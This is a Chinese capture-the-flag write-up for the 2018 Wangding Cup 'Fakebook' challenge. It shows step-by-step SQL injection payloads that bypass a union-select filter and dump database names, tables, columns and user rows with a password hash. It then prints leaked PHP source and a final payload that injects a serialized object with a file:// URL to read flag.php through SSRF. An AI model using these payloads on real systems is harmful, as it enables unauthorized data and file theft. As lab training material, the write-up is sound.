## [网鼎杯 2018]Fakebook

考点：sql数字型注入，php序列化，file协议,爬虫协议，源码备份，SSRF

> 在view.php中发现数字型注入
>
> ```
> no=1 or 1=1 回显成功
> no=1 or 1=2 报错
> ```

> 进行读取数据库数据

测试字段数

```
no=-1 order by 1,2,3,4# 一共四个字段
```

读取数据库名（这里`union select`整体被过滤了）

```
-1 union/**/select 1,2,3,4
```

观察页面，发现只有2位置有回显，接着写语句

爆当前数据库 

```
-1 union/**/select 1,database(),3,4
fakebook
```

爆表名

```
-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook'
users
```

爆字段名

```
-1 union/**/select 1,group_concat(column_name) ,3,4 from information_schema.columns where table_name='users'
no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS
```

查看字段的值

```
-1 union/**/select 1,group_concat(no,';',username,';',passwd,';',data)  ,3,4 from users
```

```
1;11;74a49c698dbd3c12e36b0b287447d833f74f3937ff132ebff7054baa18623c35a705bb18b82e2ac0384b5127db97016e63609f712bc90e3506cfbea97599f46f;O:8:"UserInfo":3:{s:4:"name";s:2:"11";s:3:"age";i:11;s:4:"blog";s:9:"baidu.com";}
```

这里data的值是序列化字符串

> 发现网站目录下还有robots.txt
>
> ```
> User-agent: *
> Disallow: /user.php.bak
> ```
>
> 访问/user.php.bak，下载源码

```php
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

> 通过get获得指定的URL，设置curl 参数，并将指定URL的内容返回，只要返回内容不为404即可

最后的payload

```
no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:2:"11";s:3:"age";i:11;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
```

利用SSRF漏洞和file协议，返回flag.php的内容

![image-20240202220349663](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240202220349663.png)

base64解码即可

这题考的挺多的，记录一下解题思路。
